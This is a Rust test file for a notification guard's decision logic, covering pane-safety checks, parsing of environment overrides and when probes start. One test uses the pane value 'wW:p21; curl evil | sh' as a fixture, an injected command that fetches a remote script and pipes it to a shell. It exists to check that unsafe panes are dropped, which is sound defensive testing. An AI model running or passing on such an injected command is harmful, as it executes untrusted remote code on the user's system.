//! The decision, pinned: guard.

use super::fixtures::*;

// --- pane safety --------------------------------------------------------

#[test]
fn an_unsafe_pane_is_dropped_once_for_every_channel() {
    let probes = CountingProbes {
        idle: Some(900),
        ..CountingProbes::default()
    };
    assert!(decide_with(&probes, &Overrides::default(), "wW:p21; curl evil | sh").pane_dropped);
}

#[test]
fn a_safe_pane_is_not_dropped() {
    let probes = CountingProbes {
        idle: Some(900),
        ..CountingProbes::default()
    };
    assert!(!decide_with(&probes, &Overrides::default(), "wW:p21").pane_dropped);
}

// --- overrides parsing --------------------------------------------------

#[test]
fn a_garbage_idle_override_is_unknown_without_a_probe_read() {
    // Bash keeps a non-empty override and never runs the probe. Falling
    // back to the probe would both pay the read and let a live reading
    // hold the operator at a desk the override said nothing about.
    let vars = BTreeMap::from([("PNS_IDLE_SECS".to_string(), "not-a-number".to_string())]);
    let overrides = Overrides::from_env(&vars);
    let probes = CountingProbes {
        idle: Some(5),
        ..CountingProbes::default()
    };
    let decision = decide_with(&probes, &overrides, "");
    assert_eq!(probes.idle_reads.get(), 0);
    assert!(
        names(&decision).contains(&"mobile"),
        "an unknown desk reading falls toward away, which cards"
    );
}

#[test]
fn a_garbage_desk_threshold_fails_toward_away_never_into_the_default() {
    // Substituting the default would read a stale desk as fresh and hold
    // the operator at a desk they are not at.
    let vars = BTreeMap::from([("PNS_DESK_IDLE_SECS".to_string(), "0600".to_string())]);
    let overrides = Overrides::from_env(&vars);
    let probes = CountingProbes {
        idle: Some(5),
        ..CountingProbes::default()
    };
    let decision = decide_with(&probes, &overrides, "");
    assert!(names(&decision).contains(&"mobile"));
}

// --- the predicates `start` and the read guards share -------------------

#[test]
fn reads_desk_is_true_only_when_the_idle_guard_below_would_run_the_probe() {
    // ONE SPELLING for the override rule: this is the exact question
    // `start` asks before spawning and the guard asks before reading, so
    // a probe can never be started for an answer the caller already gave.
    assert!(Overrides::default().reads_desk());
    assert!(
        !Overrides {
            idle_invalid: true,
            ..Overrides::default()
        }
        .reads_desk(),
        "a garbled override answers unknown outright"
    );
    assert!(
        !Overrides {
            idle_secs: Some(5),
            ..Overrides::default()
        }
        .reads_desk(),
        "a stated idle clock answers outright"
    );
}

#[test]
fn reads_phone_is_true_only_when_the_phone_guard_below_would_run_the_chain() {
    assert!(Overrides::default().reads_phone());
    assert!(
        !Overrides {
            phone_invalid: true,
            ..Overrides::default()
        }
        .reads_phone()
    );
    assert!(
        !Overrides {
            phone_input_age: Some(5),
            ..Overrides::default()
        }
        .reads_phone()
    );
}

#[test]
fn start_is_asked_for_exactly_what_the_read_guards_below_it_would_consult() {
    // The override rule has to reach `start` with the same answer the
    // guard below it reads, or a probe gets begun for a reading the
    // caller already gave. A stated idle clock must not start the desk
    // pair; a stated phone age must not start the phone chain.
    let probes = CountingProbes {
        idle: Some(2),
        view: Some(watching("wW:p1")),
        ..CountingProbes::default()
    };
    decide_with(
        &probes,
        &Overrides {
            idle_secs: Some(5),
            ..Overrides::default()
        },
        "wW:p1",
    );
    assert_eq!(
        probes.wants.get(),
        Some(Wants {
            desk: false,
            phone: true
        }),
        "a stated idle clock must start no desk thread"
    );
    assert_eq!(
        probes.start_calls.get(),
        1,
        "one event asks probes.start exactly once"
    );

    let probes = CountingProbes {
        idle: Some(2),
        view: Some(watching("wW:p1")),
        ..CountingProbes::default()
    };
    decide_with(
        &probes,
        &Overrides {
            phone_input_age: Some(5),
            ..Overrides::default()
        },
        "wW:p1",
    );
    assert_eq!(
        probes.wants.get(),
        Some(Wants {
            desk: true,
            phone: false
        }),
        "a stated phone age must start no phone thread"
    );
    assert_eq!(
        probes.start_calls.get(),
        1,
        "one event asks probes.start exactly once"
    );

    // sol review, ROW 3: only VALID overrides reached this test. A
    // GARBLED override must refuse the read exactly as a stated one
    // does, and `start` must not spawn a thread for it either.
    let probes = CountingProbes {
        idle: Some(2),
        view: Some(watching("wW:p1")),
        ..CountingProbes::default()
    };
    decide_with(
        &probes,
        &Overrides {
            idle_invalid: true,
            ..Overrides::default()
        },
        "wW:p1",
    );
    assert_eq!(
        probes.wants.get(),
        Some(Wants {
            desk: false,
            phone: true
        }),
        "a garbled idle override must start no desk thread"
    );
    assert_eq!(
        probes.start_calls.get(),
        1,
        "one event asks probes.start exactly once"
    );

    let probes = CountingProbes {
        idle: Some(2),
        view: Some(watching("wW:p1")),
        ..CountingProbes::default()
    };
    decide_with(
        &probes,
        &Overrides {
            phone_invalid: true,
            ..Overrides::default()
        },
        "wW:p1",
    );
    assert_eq!(
        probes.wants.get(),
        Some(Wants {
            desk: true,
            phone: false
        }),
        "a garbled phone override must start no phone thread"
    );
    assert_eq!(
        probes.start_calls.get(),
        1,
        "one event asks probes.start exactly once"
    );
}

#[test]
fn skip_and_force_parse_from_their_relay_variables() {
    let vars = BTreeMap::from([
        ("PNS_SKIP_PHONE".to_string(), "1".to_string()),
        ("PNS_FORCE_PHONE".to_string(), "1".to_string()),
    ]);
    let overrides = Overrides::from_env(&vars);
    assert!(overrides.skip_phone);
    assert!(overrides.force_phone);
}
